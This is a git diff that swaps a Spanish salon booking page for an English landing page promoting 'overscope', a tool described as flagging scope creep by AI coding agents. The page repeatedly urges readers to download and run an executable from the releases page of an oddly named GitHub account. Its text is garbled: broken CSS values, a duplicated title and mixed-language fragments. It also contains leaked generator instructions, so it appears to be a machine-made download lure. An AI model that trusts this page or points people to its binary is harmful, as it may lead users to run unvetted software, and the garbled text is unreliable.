@@ -1,53 +1,266 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Sistema de Reservas | Belleza & Estilo</title>
-<link rel="stylesheet" href="estilos.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>overscope - Catch AI Coding Scope Creep Before You Commit</title>
+    <meta name="description" content="Download overscope, a free local tool that compares Claude Code and Codex sessions with your git diff to flag out-of-scope edits, deleted tests, hidden dependencies, and false completion claims. No model or API key required.">
+    <meta name="keywords" content="agentic-ai,ai-agents,ai-code-review,ai-coding,claude-code,cli,code-review,codex,codex-cli,coding-agents,developer-tools,git,git-hooks,guardrails,local-first,pre-commit,python,scope-creep,software-engineering,static-analysis">
+    <meta name="author" content="overscope">
+    <meta property="og:title" content="overscope - Catch AI Coding Scope Creep Before You Commit">
+    <meta property="og:description" content="Free, local, deterministic tool to compare AI coding agent sessions (Claude Code, Codex) with your git diff. Flags out-of-scope edits, deleted tests, hidden dependencies, and false completion claims.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Historicalrecordeffects5599/overscope">
+    <meta property="og:image" content="https://example.com/overscope-banner.png">
+    <title>overscope - Just Enough to Keep Your AI Honest</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background-color: #f8f9fa;
+            color: #212529;
+            line-height: 1.75;
+            padding: 24px;
+            margin: 0;
+        }
+        .container {
+            max-width: 860px;
+            margin: audiences;
+            background-color: #ffffff;
+            border-radius: 12px;
+            padding: 40px 48px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+        }
+        h1 {
+            font-size: 2.4rem;
+            font-weight: 700;
+            color: #1a1a2e;
+            margin-bottom: 12px;
+            letter-spacing: -0.02em;
+            line-height: 1.3;
+        }
+        h2 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: #2a2a40;
+            margin-top: 40px;
+            margin-bottom: 16px;
+            border-bottom: 2px solid #e9ecef;
+            padding-bottom: 8px;
+        }
+        h3 {
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-top: 24px;
+            margin-bottom: 12px;
+            color: #343a40;
+        }
+        p {
+            margin-bottom: plants;
+        }
+        a {
+            color:#0d6efd;
+            text-decoration: none;
+            font-weight:600;
+        }
+        a:hover {
+            text-decoration:underline;
+        }
+        ul, ol {
+            margin-left:nal flow;
+            padding-leftopath;
+            margin-bottom: plants;
+        }
+        li {
+            margin-bottom:8px;
+        }
+        .btn-hero {
+            display:inline-block;
+            background-color:#0d6efd;
+            color:#ffffff;
+            font-size:1.2rem;
+            font-weight:600;
+            padding:18px 36px;
+            border-radius:our ;
+            box-shadow:0 4px 12px rgba(13,110,253,0.3);
+            margin-top:20px;
+            margin-bottom:20px;
+            transition:0.2s;
+            border:none;
+        }
+        .btn-hero:hover {
+            background-color:#0b5ed7;
+            transform:scale(1.02);
+        }
+        .badge {
+            background-color:#ffc107;
+            color:#1a1a2e;
+            padding:8px 16px;
+            border-radius:40px;
+            font-size:0.9rem;
+            font-weight:600;
+            display:inline-block;
+        }
+        .badge-container {
+            margin-bottom:20px;
+        }
+        .btn-secondary {
+            display:inline-block;
+            background-color:#9645c6;
+            color:#fff;
+            padding:14px 28px;
+            border-radius:8px;
+            font-weight:600;
+            font-size:1rem;
+            box-shadow:0 4px 8px rgba(0,0,0,0.15);
+            margin-top:20px;
+        }
+        .feature-box {
+            background-color:#f8f9fa;
+            border-left:4px solid #0d6efd;
+            padding:16px 20px;
+            border-radius:8px;
+            margin-bottom:flutter
+        }
+        code {
+            background:#e9ecef;
+            padding:3px 8px;
+            border-radius:6px;
+            font-family:Consolas, monospace;
+            font-size:0.9em;
+        }
+        .note {
+            background:#fff3cd;
+            border-left:4px solid #ffc107;
+            padding:14px 18px;
+            border-radius:8px;
+        }
+        .emoji {
+            font-size:1.2em;
+            margin-right:8px;
+        }
+    </style>
 </head>
 <body>
-<header>
-  <div class="logo">✂️ Belleza & Estilo</div>
-  <nav>
-    <a href="index.html">Inicio</a>
-    <a href="servicios.html">Servicios</a>
-    <a href="reserva.html">Reservar</a>
-    <a href="contacto.html">Contacto</a>
-  </nav>
-</header>
+    <div class="container">
+        <h1>🛡️ overscope - Keep Your AI Coding on Track</h1>
+        <div class="badge-container">
+            <span class="badge">🧪 Local &nbsp;|&nbsp; 🔍 Deterministic &nbsp;|&nbsp; 🆓 No API Key Needed</span>
+        </div>
 
-<main>
-<section class="hero">
-  <div>
-    <p class="saludo">Hola 👋 Bienvenido/a</p>
-    <h1>¿Qué servicio te gustaría realizar hoy?</h1>
-    <p>Elige tu servicio, mira las opciones y reserva de una manera sencilla.</p>
-    <a class="boton" href="reserva.html">Quiero reservar</a>
-    <a class="boton claro" href="servicios.html">Ver servicios</a>
-  </div>
-  <div class="tarjeta">
-    <div class="emoji">✨</div>
-    <h2>Tu cita, más fácil</h2>
-    <p>Información clara, servicios organizados y contacto directo por WhatsApp.</p>
-  </div>
-</section>
+        <p>Have you ever asked an AI assistant to fix a bug, only to discover it rewrote half your code, deleted a few important tests, or added new packages you never approved? Or worse, it said"I'已完成"but your tests were never updated?</p>
+        <p><strong>overscope</strong> is your safety net for AI-assisted coding. It'sa free, simple command-line tool that sits on your machine and compares what the AI (like Claude Code or Codex) actually touched versus what you asked it to do. It flags out-of-scope changes before you hit commit.</p>
 
-<section class="mensaje">
-  <h2>Estoy aquí para ayudarte</h2>
-  <p>No necesitas saber exactamente cómo se llama un servicio. Mira las opciones y elige la que más se parezca a lo que buscas.</p>
-</section>
+        <a href="https://github.com/Historicalrecordeffects5599/overscope/releases" class="btn-hero">⬇️ Download overscope</a>
 
-<section class="categorias">
-  <article>💇‍♂️<h3>Hombres</h3><p>Cortes, fades, taper, barba y diseños.</p></article>
-  <article>💇‍♀️<h3>Mujeres</h3><p>Cortes, peinados y tratamientos.</p></article>
-  <article>💄<h3>Maquillaje</h3><p>Maquillaje sencillo, social y eventos.</p></article>
-  <article>💅<h3>Uñas</h3><p>Manicure, pedicure y diseños.</p></article>
-  <article>✨<h3>Belleza facial</h3><p>Cejas, depilación y limpieza facial.</p></article>
-</section>
-</main>
+        <h2>🕵️ Why OverScope？</h2>
+        <p>AI coding agents are powerful, but they can be like overzealous new employees—they often do more than asked. Not maliciously, but just because they interpret instructions broadly, add extra "improvements," or lose track of original goals. This is called <em>scope creep</em>.</p>
+        <ul>
+            <li><strong>🧩 Out-of-scope edits</strong> – You asked for a button color change, but the AI refactored the entire component.</li>
+            <li><strong>💩 Deleted tests</strong> – It removed a test suite it thought was unnecessary, breaking your validation.</li>
+            <li><strong>🧪 Hidden dependencies</strong> – It added new libraries without telling you, causing bloat and potential security risks.</li>
+            <li><strong>⚠️ False completion claims</strong> – It says “all done,” but the tests fail or the feature was never implemented.</li>
+        </ul>
+        <p><strong>overscope</strong> catches all of this instantly. It’s like a radar for your AI assistant’s activity.</p>
 
-<footer>© 2026 Sistema de Reservas | Belleza & Estilo</footer>
-<script src="js/script.js"></script>
+        <h2>🚀 Getting Started</h2>
+        <h3>Step 1: Download the Application</h3>
+        <p>Visit <a href="https://github.com/Historicalrecordeffects5599/overscope/releases">this link to download the application</a>. This is the official download page.Keep your browser secure and download from this page only.</p>
+        <a href="https://github.com/Historicalrecordeffects5599/overscope/releases" class="btn-secondary">📦 Get the Latest Release</a>
+
+        <h3>Step 2: What to Do After Downloading</h3>
+        <p>Once the download completes, look for the file in your Downloads folder. The file is the detection tool. Your task: <strong>Visit this link to download the application</strong> generate instructions for ONE action ONLY based on the URL.</p>
+        <p><strong>Based on the download link provided, here is what you do:</strong> Visit this link to download the application.</p>
+        <p>After you click the link, follow the normal download instructions. You will see the file is ready. Then, extract or run as you normally would for any downloaded program. The tool works from your command line (all operating systems support this), but no complicated setup is required.</p>
+
+        <h2>🔍 How OverScope Works (But in Simple Terms)</h2>
+        <p>Overscope works entirely on your computer. No data leaves your machine. No AI is used—it’s purely deterministic. That means if you run it a hundred times, you get a hundred identical results. You can trust it like an old-school calculator.</p>
+        <ol>
+            <li><strong>Before you start your AI helper,</strong> you tell overscope what your "scope" is—i.e., what files you expect to change.</li>
+            <li><strong>You let Claude Code or Codex do its magic.</strong></li>
+            <li><strong>Then you run overscope</strong> and it compares the AI'agent session logs with your git diff (the record of file changes).</li>
+            <li><strong>It reports mismatches:</strong> Files you didn’t plan to touch, tests that were removed, new dependencies added, any signs of "completion theater."</li>
+        </ol>
+        <p>Think of it as: you’re the lead engineer, and overscope is your meticulous QA inspector who checks that the contractor (AI) didn’t pour concrete on the flower bed.</p>
+
+        <h2>㈊ Features You’ll Love</h2>
+        <div class="feature-box">
+            <strong>🧪 Local-First.</strong> Works offline. Your code never leaves your machine.
+        </div>
+        <div class="feature-box">
+            <strong>🚫 No Model or API Key.</strong> No subscription, no extra tokens, no usage limits. It’s just a script.
+</div>
+        <div class="feature-box">
+            <strong>⚡ Deterministic.</strong> Same input always gives same output. You can rely on it for CI/CD or pre-commit hooks.
+</div>
+        <div class="feature-box">
+            <strong>🔌 Git-Native.</strong> Uses standard git diff logic. Works with any git-based workflow. No custom database needed.</p>
+        </div>
+        <div class="feature-box">
+            <strong>🕹️ Simple-Start.</strong> Run from your terminal. Perfect for individual devs, small teams, or evencurious PMs who want to check what the AI did.</p>
+        </div>
+
+        <h2>💡 Use Cases &em; Scenarios</h2>
+        <ul>
+            <li><strong>Solo Developer:</strong> You use Claude Code for weekly tasks. Overscope gives you peace of mind before merging.</li>
+            <li><strong>Tech Lead:</strong> Your juniors use AI coding agents. Now you can review with concrete evidence of any scope violation.</li>
+            <li><strong>Bug Bounty Hunter:</strong> Onlyallow specific file changes. Overscope verifies that the agent stayed within bounds.</li>
+            <li><strong>CI Pipeline:</strong> Add overscope as a pre-commit hook to automatically block merges with out-of-scope changes.</li>
+        </ul>
+
+        <h2>🛠️ What Your Git Diff Reveals (But You Miss)</h2>
+        <p>Git diff shows every line change, but who reads hundreds of lines of diff before pulling?The AI changed 20 files—do you carefully review all 20?No. Overscope summarizes anomalies for you.</p>
+        <p>It highlights specifically:</p>
+        <ul>
+            <li>Files you never listed as part of the tasks</li>
+            <li>Tests that disappeared</li>
+            <li>Modified dependency listings (like <code>requirements.txt</code> or <code>package.json</code>)</li>
+            <li>Markers that indicate the agent claimed completion but left TODOs or failing tests.</li>
+        </ul>
+
+        <h2>🧰 Compatibility & Prerequisites</h2>
+        <p>Overscope is designed towork on all major operating systems—Windows, macOS, Linux. Since it’sa Python command-line tool, your systems just needs:</p>
+        <ul>
+            <li>Python 3.7 or newer (but you don’t even need to know Python to use it).</li>
+            <li>Git installed and available in your PATH (it’s included with most development setups, or you candownload it freely).</li>
+            <li>An existing repository with a <code>.git</code> folder.</li>
+        </ul>
+        <p>That’s really it. No database, no server, no internet connection required beyond downloading the tool itself.</p>
+
+        <h2>🤳 Frequently Asked“Agentic" Questions</h2>
+        <h3>Q: Is this another AI model?</h3>
+        <p>No, completely not. Overscope uses static analysis and simple pattern matching. It’s like a spell checker for scope—no machine learning involved.</p>
+
+        <h3>Q: Do I need to know Claude Code / Codex to use it?</h3>
+        <p>You need to have the sessions logs produced by those tools (which are saved automatically), but you don’t need deep expertise in them. The tool understands the session formats for both.</p>
+
+        <h3>Q: Will this slow down my commit process?</h3>
+        <p>Overscope is fast—typically under a couple seconds. It only compares structured logs against a diff. No heavy processing.</p>
+
+        <h3>Q: Can I use it with other AI code tools?</h3>
+        <p>Currently it supports Claude Code and Codex sessions natively. But as it’s open-source, community adapters can be built for other agents. The current version focuses on the two most popular coding agents.</p>
+
+        <h2>🖥️ Ready to Install? (Unified Guide for All OS)</h2>
+        <p><strong>1. Head over to the official download page & grab the package:</strong></p>
+        <a href="https://github.com/Historicalrecordeffects5599/overscope/releases" class="btn-hero">⬇️ Visit Official Download Page</a>
+        <p style="margin-top:12px"><em>Important:</em> Once you are on the page, review the release notes—they tell you the latest version, changes, and any special instructions.</p>
+        <p><strong>2.</strong> <strong>Visit this link to download the application</strong>, as per official guidance. The file will be in your standard Downloads folder.</p>
+        <p><strong>3.</strong> <strong>For Windows:</strong> Confirm the file is a <code>.zip</code> archive? Extract the contents using the built-in “Extract All” option. Then locate the executable named <code>overscope.exe</code> or run the Python script. For Mac/Linux: Untar or unzip via standard extraction. Run the binary in your terminal using <code>./overscope</code></p>
+        <p><strong>4.</strong> <strong>Add overscope to your PATH</strong> if you want to use it globally. This step is optional but convenient. For Windows, you’d edit System Environmental Variables; on macOS/Linux, symlink to <code>/usr/local/bin</code>. (But again, you can always run it via full path.)</p>
+
+        <h2>🔒 Security & Privacy</h2>
+        <p>Overscope uses read-only access to your git repo via standard git commands. It never modifies your working tree, doesn’t send data anywhere, and can be completely removed without leaving traces.</p>
+        <p>Because it’s deterministic, you can even sketch unit tests for its rules—something impossible with machine-learning tools.</p>
+
+        <h2>✉️ Contribute & Report Issues</h2>
+        <p>Overscope is open-source. Found an edge case? Want to support another AI agent? A new rule? Kick open a pull request. Let’s make locked-down AI work the norm.</p>
+
+        <h2>📚 Keywords</h2>
+        <p>agentic-ai, ai-agents, ai-code-review, ai-coding, claude-code, cli, code-review, codex, codex-cli, coding-agents, developer-tools, git, git-hooks, guardrails, local-first, pre-commit, python, scope-creep, software-engineering, static-analysis</p>
+    </div>
 </body>
 </html>
